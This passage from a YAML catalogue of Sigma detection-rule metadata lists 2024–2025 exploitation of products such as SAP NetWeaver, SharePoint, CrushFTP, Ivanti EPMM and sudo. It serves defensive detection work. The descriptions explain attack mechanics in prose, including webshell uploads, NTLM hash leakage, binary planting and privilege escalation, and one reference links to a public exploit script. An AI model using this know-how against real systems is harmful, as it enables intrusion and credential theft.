  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 05164d17-8e11-4d7d-973e-9e4962436b87
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/SlashAndGrab-Exploitation-In-Wild/file_event_win_apt_unknown_exploitation_indicators.yml
  name: ScreenConnect - SlashAndGrab Exploitation Indicators
  description: 'Detects indicators of exploitation by threat actors during exploitation
    of the "SlashAndGrab" vulnerability related to ScreenConnect as reported Team
    Huntress

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c76b3d0-afe4-4870-9443-ffe6773c5fef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-10035/proc_creation_win_exploit_cve_2025_10035.yml
  name: Potential Exploitation of GoAnywhere MFT Vulnerability
  description: 'Detects suspicious command execution by child processes of the GoAnywhere
    Managed File Transfer (MFT) application, which may indicate exploitation such
    as CVE-2025-10035.

    This behavior is indicative of post-exploitation activity related to CVE-2025-10035,
    as observed in campaigns by the threat actor Storm-1175.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.001
  - T1133
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.execution
  - attack.t1059.001
  - attack.persistence
  - attack.t1133
  - detection.emerging-threats
  - cve.2025-10035
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2025/10/06/investigating-active-exploitation-of-cve-2025-10035-goanywhere-managed-file-transfer-vulnerability/
  false_positives:
  - Legitimate administrative scripts or built-in GoAnywhere functions could potentially
    trigger this rule. Tuning may be required based on normal activity in your environment.
  notes: ''
- detection_id: 15697955-6a29-47ca-92e9-0e05efae3260
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-20333/proxy_exploit_cve_2025_20333.yml
  name: Cisco ASA Exploitation Activity - Proxy
  description: 'Detects suspicious requests to Cisco ASA WebVpn via proxy logs associated
    with CVE-2025-20333 and CVE-2025-20362 exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2025-20333
  - cve.2025-20362
  - detection.emerging-threats
  time_window: ''
  references:
  - https://x.com/defusedcyber/status/1971492272966598683
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5a7132c0-86db-4e6b-95c0-f0e9d7f461aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-24054/file_event_win_exploit_cve_2025_24054_library_ms.yml
  name: Suspicious Creation of .library-ms File  Potential CVE-2025-24054 Exploit
  description: 'Detects creation of ''.library-ms'' files, which may indicate exploitation
    of CVE-2025-24054. This vulnerability allows an attacker to trigger an automatic
    outbound SMB or WebDAV authentication request to a remote server upon archive
    extraction.

    If the system is unpatched, no user interaction is required beyond extracting
    a malicious archivepotentially exposing the user''s NTLMv2-SSP hash to the attacker.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1187
  tags:
  - detection.emerging-threats
  - attack.credential-access
  - attack.t1187
  - cve.2025-24054
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054
  - https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/
  false_positives:
  - Legitimate Library shortcuts under %APPDATA%\Microsoft\Windows\Libraries\ (rarely
    created by end-users)
  - Custom corporate scripts that programmatically generate .library-ms Files
  notes: ''
- detection_id: 2d79e371-2a27-42de-87a4-b4213fc72a6a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-30406/proc_creation_win_exploit_cve_2025_30406_centrestack_portal_child_process.yml
  name: Suspicious Process Spawned by CentreStack Portal AppPool
  description: 'Detects unexpected command shell execution (cmd.exe) from w3wp.exe
    when tied to CentreStack''s portal.config, indicating potential exploitation (e.g.,
    CVE-2025-30406)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.003
  - T1505.003
  tags:
  - attack.persistence
  - attack.execution
  - attack.t1059.003
  - attack.t1505.003
  - cve.2025-30406
  - detection.emerging-threats
  time_window: ''
  references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-30406
  - https://blackpointcyber.com/blog/racing-to-exploit-centrestacks-cve-2025-30406/
  - https://gladinetsupport.s3.us-east-1.amazonaws.com/gladinet/securityadvisory-cve-2005.pdf
  - https://www.bleepingcomputer.com/news/security/centrestack-rce-exploited-as-zero-day-to-breach-file-sharing-servers/
  false_positives:
  - Potentially if other portal services run on w3wp with a apppool\portal\portal.config,
    if you want to increase scope you could add user IIS APPPOOL\portal.
  notes: ''
- detection_id: 459628e3-1b00-4e9b-9e5b-7da8961aea35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31161/proc_creation_win_crushftp_susp_child_processes.yml
  name: Suspicious CrushFTP Child Process
  description: 'Detects suspicious child processes spawned by the CrushFTP service
    that may indicate exploitation of remote code execution vulnerabilities such as

    CVE-2025-31161, where attackers can achieve RCE through crafted HTTP requests.

    The detection focuses on commonly abused Windows executables (like powershell.exe,
    cmd.exe etc.) that attackers typically use post-exploitation to execute malicious
    commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1190
  tags:
  - attack.initial-access
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1190
  - cve.2025-31161
  - detection.emerging-threats
  time_window: ''
  references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-2825
  - https://www.crushftp.com/crush11wiki/Wiki.jsp?page=Update
  - https://outpost24.com/blog/crushftp-auth-bypass-vulnerability/
  - https://attackerkb.com/topics/k0EgiL9Psz/cve-2025-2825/rapid7-analysis
  - https://projectdiscovery.io/blog/crushftp-authentication-bypass
  false_positives:
  - Legitimate CrushFTP administrative actions
  - Software updates
  notes: ''
- detection_id: 5b91409c-cb18-4ab6-ac75-c5759f998409
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31324/file_event_lnx_sap_netweaver_webshell_creation.yml
  name: Potential SAP NetWeaver Webshell Creation - Linux
  description: 'Detects the creation of suspicious files (jsp, java, class) in SAP
    NetWeaver directories,

    which may indicate exploitation attempts of vulnerabilities such as CVE-2025-31324.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.003
  - T1190
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1059.003
  - cve.2025-31324
  - detection.emerging-threats
  time_window: ''
  references:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31324
  - https://reliaquest.com/blog/threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/
  - https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/
  false_positives:
  - Legitimate creation of jsc or java files in these locations
  notes: ''
- detection_id: 86a7c91f-98c3-4f14-a58d-d989421e1234
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31324/file_event_win_sap_netweaver_webshell_creation.yml
  name: Potential SAP NetWeaver Webshell Creation
  description: 'Detects the creation of suspicious files (jsp, java, class) in SAP
    NetWeaver directories,

    which may indicate exploitation attempts of vulnerabilities such as CVE-2025-31324.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.003
  - T1190
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1059.003
  - cve.2025-31324
  - detection.emerging-threats
  time_window: ''
  references:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31324
  - https://reliaquest.com/blog/threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/
  - https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/
  false_positives:
  - Legitimate creation of jsc or java files in these locations
  notes: ''
- detection_id: 69dea60b-2deb-4c9e-a685-ad542f4367f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31324/proc_creation_lnx_sap_netweaver_susp_child_process.yml
  name: Suspicious Child Process of SAP NetWeaver - Linux
  description: 'Detects suspicious child processes spawned by SAP NetWeaver on Linux
    systems that could indicate potential

    exploitation of vulnerability that allows arbitrary execution via webshells such
    as CVE-2025-31324.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.003
  - T1190
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1059.003
  - cve.2025-31324
  - detection.emerging-threats
  time_window: ''
  references:
  - https://reliaquest.com/blog/threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/
  - https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/
  false_positives:
  - Legitimate administrative activities such as software updates
  notes: ''
- detection_id: 5b304bcb-ac33-49d0-87af-fa1b3ca94333
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31324/proc_creation_win_sap_netweaver_susp_child_process.yml
  name: Suspicious Child Process of SAP NetWeaver
  description: 'Detects suspicious child processes spawned by SAP NetWeaver that could
    indicate potential

    exploitation of vulnerability that allows arbitrary execution via webshells such
    as CVE-2025-31324.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.003
  - T1190
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1059.003
  - cve.2025-31324
  - detection.emerging-threats
  time_window: ''
  references:
  - https://reliaquest.com/blog/threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/
  - https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/
  false_positives:
  - Legitimate administrative activities such as software updates
  notes: ''
- detection_id: 94e12f41-6cb3-45c5-97b1-c783a7bf2e72
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31324/web_lnx_exploit_cve_2025_31324_sap_netviewer_webshell.yml
  name: Potential SAP NetViewer Webshell Command Execution
  description: 'Detects potential command execution via webshell in SAP NetViewer
    through JSP files with cmd parameter.

    This rule is created to detect exploitation of vulnerabilities like CVE-2025-31324,
    which allows remote code execution via a webshell.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  - cve.2025-31324
  time_window: ''
  references:
  - https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures
  false_positives:
  - Legitimate applications using cmd parameter for non-malicious purposes
  notes: ''
- detection_id: 639b893f-f93a-4e53-a7c8-f08cf73fe7f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-31324/web_lnx_exploit_cve_2025_31324_sap_netviewer_webshell_uploaded.yml
  name: Potential Java WebShell Upload in SAP NetViewer Server
  description: 'Detects potential Java webshell uploads via HTTP requests with Content-Type
    ''application/octet-stream'' and Java file extensions.

    This behavior might indicate exploitation of vulnerabilities like CVE-2025-31324,
    which allows remote code execution through webshells in SAP NetViewer.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - detection.emerging-threats
  - cve.2025-31324
  time_window: ''
  references:
  - https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures
  false_positives:
  - Legitimate uploads of Java files in development environments
  notes: ''
- detection_id: 10ac0730-c24e-4f4c-81f8-b13a1ac95a1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-32463/file_event_lnx_exploit_cve_2025_32463.yml
  name: Non-Standard Nsswitch.Conf Creation - Potential CVE-2025-32463 Exploitation
  description: 'Detects the creation of nsswitch.conf files in non-standard directories,
    which may indicate exploitation of CVE-2025-32463.

    This vulnerability requires an attacker to create a nsswitch.conf in a directory
    that will be used during sudo chroot operations.

    When sudo executes, it loads malicious shared libraries from user-controlled locations
    within the chroot environment,

    potentially leading to arbitrary code execution and privilege escalation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - cve.2025-32463
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/kh4sh3i/CVE-2025-32463/blob/81bb430f84fa2089224733c3ed4bfa434c197ad4/exploit.sh
  false_positives:
  - Backup locations
  notes: ''
- detection_id: 04fc4b22-91a6-495a-879d-0144fec5ec03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-33053/image_load_win_exploit_cve_2025_33053.yml
  name: Potential Exploitation of RCE Vulnerability CVE-2025-33053 - Image Load
  description: 'Detects potential exploitation of remote code execution vulnerability
    CVE-2025-33053

    by monitoring suspicious image loads from WebDAV paths. The exploit involves malicious
    executables from

    attacker-controlled WebDAV servers loading the Windows system DLLs like gdi32.dll,
    netapi32.dll, etc.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1105
  - T1218
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.lateral-movement
  - attack.t1105
  - detection.emerging-threats
  - cve.2025-33053
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-33053
  - https://research.checkpoint.com/2025/stealth-falcon-zero-day/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a2d8b3e-f5a1-4c68-9e21-7d9e1cf8a123
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-33053/proc_access_win_exploit_cve_2025_33053.yml
  name: Potential Exploitation of RCE Vulnerability CVE-2025-33053 - Process Access
  description: 'Detects potential exploitation of remote code execution vulnerability
    CVE-2025-33053

    by looking for process access that involves legitimate Windows executables (iediagcmd.exe,
    CustomShellHost.exe)

    accessing suspicious executables hosted on WebDAV shares. This indicates an attacker
    may be exploiting

    Process.Start() search order manipulation to execute malicious code from attacker-controlled
    WebDAV servers

    instead of legitimate system binaries. The vulnerability allows unauthorized code
    execution through

    external control of file names or paths via WebDAV.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1105
  - T1218
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.lateral-movement
  - attack.t1105
  - detection.emerging-threats
  - cve.2025-33053
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-33053
  - https://research.checkpoint.com/2025/stealth-falcon-zero-day/
  false_positives:
  - Unknown
  notes: ''
- detection_id: abe06362-a5b9-4371-8724-ebd00cd48a04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-33053/proc_creation_win_exploit_cve_2025_33053.yml
  name: Potential Exploitation of RCE Vulnerability CVE-2025-33053
  description: 'Detects potential exploitation of remote code execution vulnerability
    CVE-2025-33053

    which involves unauthorized code execution via WebDAV through external control
    of file names or paths.

    The exploit abuses legitimate utilities like iediagcmd.exe or CustomShellHost.exe  by
    manipulating

    their working directories to point to attacker-controlled WebDAV servers, causing
    them to execute

    malicious executables (like route.exe) from the WebDAV path instead of legitimate
    system binaries

    through Process.Start() search order manipulation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1105
  - T1218
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.lateral-movement
  - attack.t1105
  - detection.emerging-threats
  - cve.2025-33053
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-33053
  - https://research.checkpoint.com/2025/stealth-falcon-zero-day/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 41956f7c-7a6b-46d6-b6bb-da6eb2e83fbe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-4427/web_invanti_epmm_cve_2025_4427_and_cve_2025_4428.yml
  name: Potential Exploitation of CVE-2025-4427/4428 Ivanti EPMM Pre-Auth RCE
  description: 'Detects potential exploitation of a chained vulnerability attack targeting
    Ivanti EPMM 12.5.0.0.

    CVE-2025-4427 allows unauthenticated access to protected API endpoints via an
    authentication bypass,

    which can then be leveraged to trigger CVE-2025-4428  a remote code execution
    vulnerability through

    template injection. This sequence enables unauthenticated remote code execution,
    significantly increasing

    the impact of exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: experimental
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  - T1203
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.execution
  - attack.t1203
  - cve.2025-4427
  - cve.2025-4428
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/?123
  false_positives:
  - Unknown
  notes: ''
- detection_id: 933f0bb5-0681-4fe7-8a17-4e6cccbaac44
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-49144/proc_creation_win_exploit_cve_2025_49144.yml
  name: Potential Notepad++ CVE-2025-49144 Exploitation
  description: 'Detects potential exploitation of CVE-2025-49144, a local privilege
    escalation vulnerability in Notepad++ installers (v8.8.1 and prior) where the
    installer calls regsvr32.exe without specifying the full path.

    This allows an attacker to execute arbitrary code with elevated privileges by
    placing a malicious regsvr32.exe alongside this Legitimate Notepad++ installer.

    The vulnerability is triggered when the installer attempts to register the NppShell.dll
    file, which is a component of Notepad++.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.008
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1574.008
  - cve.2025-49144
  - detection.emerging-threats
  time_window: ''
  references:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-49144
  - https://x.com/NullSecurityX/status/1937444064867029179
  false_positives:
  - Unknown
  notes: ''
- detection_id: ba479447-721f-42a9-9af2-6dcd517bbdb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-53770/file_event_win_exploit_cve_2025_53770.yml
  name: Potential SharePoint ToolShell CVE-2025-53770 Exploitation - File Create
  description: 'Detects the creation of file such as spinstall0.aspx which may indicate
    successful exploitation of CVE-2025-53770.

    CVE-2025-53770 is a zero-day vulnerability in SharePoint that allows remote code
    execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2025-53770
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.eye.security/sharepoint-under-siege/
  - https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
  - https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7477881c-ec3b-49d6-aced-7255944e5c59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-53770/proc_creation_win_exploit_cve_2025_53770_indicators.yml
  name: Potential SharePoint ToolShell CVE-2025-53770 Exploitation Indicators
  description: 'Detects potential exploitation of CVE-2025-53770 by identifying indicators
    such as suspicious command lines discovered in Post-Exploitation activities.

    CVE-2025-53770 is a zero-day vulnerability in SharePoint that allows remote code
    execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2025-53770
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.eye.security/sharepoint-under-siege/
  - https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 48d053db-6a56-4866-b60d-0975647050ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-53770/web_win_iis_exploit_cve_2025_53770.yml
  name: SharePoint ToolShell CVE-2025-53770 Exploitation - Web IIS
  description: 'Detects access to vulnerable SharePoint components potentially being
    exploited in CVE-2025-53770 through IIS web server logs.

    CVE-2025-53770 is a zero-day vulnerability in SharePoint that allows remote code
    execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2025-53770
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.linkedin.com/posts/mauricefielenbach_sharepoint-incidentresponse-windowssecurity-activity-7352653907363303425-bL2f
  - https://research.eye.security/sharepoint-under-siege/
  - https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0fdc7c7f-c690-4217-9ae3-31f5156eed72
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-54309/proc_creation_win_exploit_cve_2025_54309.yml
  name: Potential Exploitation of CrushFTP RCE Vulnerability (CVE-2025-54309)
  description: Detects suspicious child processes created by CrushFTP. It could be
    an indication of exploitation of a RCE vulnerability such as CVE-2025-54309.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1068
  - T1190
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1068
  - attack.t1190
  - cve.2025-54309
  - detection.emerging-threats
  time_window: ''
  references:
  - https://reliaquest.com/blog/threat-spotlight-cve-2025-54309-crushftp-exploit/
  - https://pwn.guide/free/web/crushftp
  - https://firecompass.com/crushftp-vulnerability-cve-2025-54309-securing-file-transfer-services/
  false_positives:
  - Legitimate administrative command execution
  notes: ''
- detection_id: c70834fa-fb9d-4aa0-9e7d-45ceed36f3f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-55182/proc_creation_lnx_exploit_cve_2025_55182_susp_nodejs_server_child_process.yml
  name: Linux Suspicious Child Process from Node.js - React2Shell
  description: 'Detects suspicious child processes spawned from Node.js server processes
    on Linux systems, potentially indicating remote code execution exploitation such
    as CVE-2025-55182 (React2Shell).

    This rule particularly looks for exploitation of vulnerability on Node.js Servers
    where attackers abuse Node.js child_process module to execute arbitrary system
    commands.

    When execSync() or exec() is used, the command line often includes a shell invocation
    followed by suspicious commands or scripts (e.g., /bin/sh -c <malicious-command>).

    For other methods, the Image field will show the spawned process directly.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1190
  tags:
  - attack.execution
  - attack.t1059
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  - cve.2025-55182
  time_window: ''
  references:
  - https://github.com/msanft/CVE-2025-55182
  - https://nodejs.org/api/child_process.html#class-childprocess
  - https://gist.github.com/swachchhanda000/a0228130f86a2dedfbcebb415b47f870
  - https://github.com/nasbench/Misc-Research/blob/2f651ede832ab34027a7ba005b63bb78f1ade378/Other/React-Next-Child-Processes-Notes.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 271de298-cc0e-4842-acd8-079a0a99ea65
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-55182/proc_creation_win_exploit_cve_2025_55182_susp_nodejs_server_child_process.yml
  name: Windows Suspicious Child Process from Node.js - React2Shell
  description: 'Detects suspicious child processes started by Node.js server processes
    on Windows, which may indicate exploitation of vulnerabilities like CVE-2025-55182
    (React2Shell).

    Attackers can abuse the Node.js ''child_process'' module to run system commands
    or scripts using methods such as spawn(), exec(), execFile(), fork(), or execSync().

    If execSync() or exec() is used in the exploit, the command line often shows a
    shell (e.g., cmd.exe /d /s /c ...) running a suspicious command unless other shells
    are explicitly invoked.

    For other methods, the spawned process appears directly in the Image field unless
    a shell is explicitly used.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
